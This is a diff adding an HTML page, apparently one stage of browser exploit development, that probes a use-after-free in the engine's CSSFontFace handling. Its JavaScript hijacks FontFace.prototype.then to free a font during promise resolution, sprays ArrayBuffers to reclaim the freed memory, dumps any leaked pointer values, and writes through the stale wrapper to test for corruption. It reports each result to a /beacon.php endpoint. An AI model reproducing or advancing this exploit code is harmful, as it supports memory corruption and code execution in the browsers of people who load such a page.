@@ -1,0 +1,157 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1149</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1149: CSSFONTFACE RECLAIM DIAGNOSTIC ===');
+log('info','Q: Does NOT saving the wrapper let CSSFontFace be freed?');
+log('info','Test A: no wrapper save, 200 spray | Test B: wrapper saved, 200 spray');
+B('P1149-START','t='+Date.now());
+
+var testNum=0;
+var results={A:{},B:{}};
+
+function runTest(label, saveWrapper, cb){
+  var r=Date.now()%100000+testNum*1000;
+  testNum++;
+  var spray=[];
+  var saved=null;
+  var hit=false;
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+  document.head.appendChild(st);
+  var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(hit)return undefined;hit=true;
+    if(saveWrapper) saved=this;
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // GC pressure: allocate and discard
+    for(var g=0;g<500;g++){var tmp=new ArrayBuffer(192);}
+    // Spray 200 x 192B
+    for(var k=0;k<200;k++) spray.push(new ArrayBuffer(192));
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    B('P1149-'+label+'-PHASE','uaf='+hit+'|spray='+spray.length+'|saved='+(saved!==null));
+
+    if(!hit){
+      B('P1149-'+label+'-DONE','nohit');
+      results[label].hit=false;
+      cb();return;
+    }
+    results[label].hit=true;
+
+    // Check for ANY non-zero values (engine wrote through stale pointer)
+    var reclaimCount=0;
+    var fingerprints=[];
+    for(var k=0;k<spray.length;k++){
+      var v=new BigUint64Array(spray[k]);
+      var hasNonZero=false;
+      for(var q=0;q<24;q++){if(v[q]!==0n){hasNonZero=true;break;}}
+      if(hasNonZero){
+        reclaimCount++;
+        if(fingerprints.length<5){
+          var fp=[];
+          for(var q=0;q<24;q++) fp.push(v[q]!==0n?1:0);
+          var vals=[];
+          for(var q=0;q<24;q++) vals.push(hex64(v[q]));
+          fingerprints.push({idx:k,fp:fp.join(''),v:vals});
+        }
+      }
+    }
+
+    results[label].reclaim=reclaimCount;
+    log(reclaimCount>0?'win':'info',label+': reclaim='+reclaimCount+'/'+spray.length);
+    B('P1149-'+label+'-RECLAIM','count='+reclaimCount);
+
+    if(reclaimCount>0){
+      for(var i=0;i<fingerprints.length;i++){
+        var f=fingerprints[i];
+        log('ptr',label+' buf['+f.idx+']: fp='+f.fp);
+        log('ptr','  q0-5: '+f.v.slice(0,6).join(' '));
+        log('ptr','  q6-11: '+f.v.slice(6,12).join(' '));
+        log('ptr','  q12-17: '+f.v.slice(12,18).join(' '));
+        log('ptr','  q18-23: '+f.v.slice(18,24).join(' '));
+        if(i<3){
+          B('P1149-'+label+'-FP-'+i,'idx='+f.idx+'|fp='+f.fp);
+          B('P1149-'+label+'-V0-'+i,f.v.slice(0,6).join('|'));
+          B('P1149-'+label+'-V1-'+i,f.v.slice(6,12).join('|'));
+          B('P1149-'+label+'-V2-'+i,f.v.slice(12,18).join('|'));
+          B('P1149-'+label+'-V3-'+i,f.v.slice(18,24).join('|'));
+        }
+      }
+    }
+
+    // If wrapper was saved, try property writes and check
+    if(saved){
+      log('phase','--- '+label+': Wrapper property writes ---');
+      // Fill pattern in spray
+      for(var k=0;k<spray.length;k++){
+        var v=new BigUint64Array(spray[k]);
+        for(var q=0;q<24;q++) v[q]=BigInt(0x11110000+q);
+      }
+      // Write through wrapper
+      var wr={};
+      try{saved.family='AAAA';wr.f='ok';}catch(e){wr.f='E';}
+      try{saved.style='italic';wr.s='ok';}catch(e){wr.s='E';}
+      try{saved.weight='900';wr.w='ok';}catch(e){wr.w='E';}
+      try{saved.display='swap';wr.d='ok';}catch(e){wr.d='E';}
+      try{saved.unicodeRange='U+0061';wr.u='ok';}catch(e){wr.u='E';}
+      B('P1149-'+label+'-WRITES',JSON.stringify(wr));
+      // Check for mods
+      var whits=0;
+      var wdetails=[];
+      for(var k=0;k<spray.length;k++){
+        var v=new BigUint64Array(spray[k]);
+        for(var q=0;q<24;q++){
+          if(v[q]!==BigInt(0x11110000+q)){
+            whits++;
+            if(wdetails.length<3){
+              var d=[];for(var dd=0;dd<24;dd++) d.push('q'+dd+'='+hex64(v[dd]));
+              wdetails.push({idx:k,changed:q,d:d});
+            }
+            break;
+          }
+        }
+      }
+      log(whits>0?'win':'info',label+': write-modified='+whits);
+      B('P1149-'+label+'-WCHK','hits='+whits);
+      for(var i=0;i<wdetails.length;i++){
+        B('P1149-'+label+'-WMOD-'+i,'idx='+wdetails[i].idx+'|q='+wdetails[i].changed);
+      }
+      results[label].whits=whits;
+    }
+
+    B('P1149-'+label+'-DONE','reclaim='+reclaimCount);
+    cb();
+  },100);
+}
+
+// Run Test A (no wrapper save) first, then Test B (wrapper saved)
+runTest('A',false,function(){
+  log('phase','--- Test A done, starting Test B ---');
+  setTimeout(function(){
+    runTest('B',true,function(){
+      log('phase','=== P1149 FINAL ===');
+      var summary='A:hit='+results.A.hit+',reclaim='+results.A.reclaim+
+        '|B:hit='+results.B.hit+',reclaim='+results.B.reclaim+',whits='+(results.B.whits||0);
+      log('win','Summary: '+summary);
+      B('P1149-SUMMARY',summary);
+      B('P1149-DONE','complete');
+    });
+  },200);
+});
+</script></body></html>
